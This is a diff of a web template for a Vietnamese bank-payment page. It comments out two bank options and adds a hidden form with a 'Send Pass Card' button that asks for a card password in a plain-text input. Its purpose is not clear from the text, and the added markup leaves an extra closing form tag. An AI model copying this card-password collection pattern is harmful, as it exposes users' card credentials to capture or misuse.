@@ -28,8 +28,8 @@
             <select name="bank-name" style="width: 200px;">
                 <option value="0">Select Bank:</option>
                 <option value="vietcombank">Vietcombank</option>
-                <option value="sacombank">Sacombank</option>
-                <option value="agribank">Agribank</option>
+                <!--<option value="sacombank">Sacombank</option>-->
+                <!--<option value="agribank">Agribank</option>-->
             </select>
         </div>
         <div class="field">
@@ -43,8 +43,16 @@
         <form class="hidden">
             <input id="kum" value="{{kum}}" type="hidden">
             <input id="kupg" value="{{kupg}}" type="hidden">
-
         </form>
+    </form>
+    <form id="password-form" class="ui form hidden" style="margin: 0 auto; width: 600px;">
+        <div class="field">
+            <label style="font-size: 1.3rem; font-weight: 600;">Password:</label>
+            <input type="text" name="card-password" placeholder="Enter Card Password" class="ui input">
+        </div>
+        <div class="btn-wrapper" style="text-align: right;">
+            <a href="#" class="ui button red" id="password-btn" onclick="sendPassword({{oi}})">Send Pass Card</a>
+        </div>
     </form>
 {% endblock %}
 
